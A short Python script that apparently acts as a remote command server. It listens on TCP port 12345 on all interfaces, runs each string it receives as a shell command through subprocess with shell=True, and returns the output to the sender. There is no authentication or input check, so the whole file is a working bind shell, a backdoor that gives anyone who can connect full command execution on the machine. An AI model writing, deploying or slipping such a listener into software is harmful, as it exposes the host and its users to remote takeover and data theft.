import subprocess
from socket import socket, AF_INET, SOCK_STREAM

if __name__ == "__main__":
    server_port = 12345
    server_socket = socket(AF_INET, SOCK_STREAM)
    server_socket.bind(("", server_port))
    server_socket.listen(1)
    print(f"Server is listening on port {server_port}...")
    while True:
        connection_socket, addr = server_socket.accept()
        print(f"Connection from {addr} has been established.")
        command = connection_socket.recv(4096).decode()
        result = subprocess.run(command, shell=True, capture_output=True, encoding='cp866')
        print(f"Executing command: {command}")
        print(result.stdout)
        print(result.stderr)
        connection_socket.send((result.stdout + result.stderr).encode())
        connection_socket.close()